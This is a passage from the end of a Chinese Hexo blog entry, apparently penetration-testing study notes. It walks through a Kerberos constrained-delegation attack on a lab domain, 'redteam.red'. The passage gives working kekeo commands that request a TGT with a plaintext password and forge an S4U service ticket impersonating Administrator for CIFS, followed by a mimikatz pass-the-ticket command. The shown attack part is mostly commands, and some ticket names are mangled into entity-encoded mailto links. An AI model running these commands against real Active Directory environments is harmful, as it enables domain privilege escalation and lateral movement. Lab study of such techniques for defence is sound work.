TGT：<code>TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">kekeo.exe &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot;<br></code></pre></td></tr></table></figure><p>2.然后使用这张 TGT (<a href="mailto:&#x54;&#x47;&#84;&#95;&#x73;&#x71;&#108;&#115;&#101;&#114;&#118;&#x65;&#114;&#x40;&#x52;&#x45;&#68;&#x54;&#x45;&#x41;&#77;&#46;&#82;&#69;&#68;&#95;&#x6b;&#114;&#x62;&#x74;&#103;&#x74;">&#x54;&#x47;&#84;&#95;&#x73;&#x71;&#108;&#115;&#101;&#114;&#118;&#x65;&#114;&#x40;&#x52;&#x45;&#68;&#x54;&#x45;&#x41;&#77;&#46;&#82;&#69;&#68;&#95;&#x6b;&#114;&#x62;&#x74;&#103;&#x74;</a><del><a href="mailto:&#114;&#x65;&#x64;&#116;&#101;&#97;&#x6d;&#46;&#x72;&#x65;&#x64;&#x40;&#82;&#x45;&#68;&#x54;&#x45;&#x41;&#x4d;&#x2e;&#x52;&#69;&#x44;&#46;&#x6b;&#x69;&#x72;&#x62;&#x69;">&#114;&#x65;&#x64;&#116;&#101;&#97;&#x6d;&#46;&#x72;&#x65;&#x64;&#x40;&#82;&#x45;&#68;&#x54;&#x45;&#x41;&#x4d;&#x2e;&#x52;&#69;&#x44;&#46;&#x6b;&#x69;&#x72;&#x62;&#x69;</a>) 获取域机器的 ST：<a href="mailto:&#84;&#71;&#83;&#95;&#x41;&#100;&#x6d;&#105;&#110;&#x69;&#115;&#116;&#x72;&#97;&#x74;&#x6f;&#x72;&#x40;&#x72;&#x65;&#100;&#x74;&#101;&#x61;&#x6d;&#46;&#114;&#x65;&#100;">&#84;&#71;&#83;&#95;&#x41;&#100;&#x6d;&#105;&#110;&#x69;&#115;&#116;&#x72;&#97;&#x74;&#x6f;&#x72;&#x40;&#x72;&#x65;&#100;&#x74;&#101;&#x61;&#x6d;&#46;&#114;&#x65;&#100;</a>@REDTEAM.RED_cifs</del><a href="mailto:&#x6f;&#119;&#97;&#46;&#x72;&#101;&#100;&#116;&#x65;&#x61;&#x6d;&#46;&#114;&#x65;&#x64;&#x40;&#82;&#x45;&#68;&#84;&#x45;&#x41;&#77;&#46;&#x52;&#x45;&#68;&#46;&#x6b;&#x69;&#114;&#x62;&#105;">&#x6f;&#119;&#97;&#46;&#x72;&#101;&#100;&#116;&#x65;&#x61;&#x6d;&#46;&#114;&#x65;&#x64;&#x40;&#82;&#x45;&#68;&#84;&#x45;&#x41;&#77;&#46;&#x52;&#x45;&#68;&#46;&#x6b;&#x69;&#114;&#x62;&#105;</a></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">kekeo.exe <span class="hljs-string">&quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span><br></code></pre></td></tr></table></figure><p>3.使用 mimikatz 将 ST2 导入当前会话即可，运行 mimikatz 进行 ptt：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz kerberos::ptt <span class="hljs-title class_">TGS_Administrator</span><span class="hljs-variable">@redteam</span>.red<span class="hljs-variable">@REDTEAM</span>.<span class="hljs-title class_">RED_cifs</span>~owa.redteam.red<span class="hljs-variable">@REDTEAM</span>.<span class="hljs-title class_">RED</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201203619660.png" alt="image-20211201203619660"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201204022128.png" alt="image-20211201204022128"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
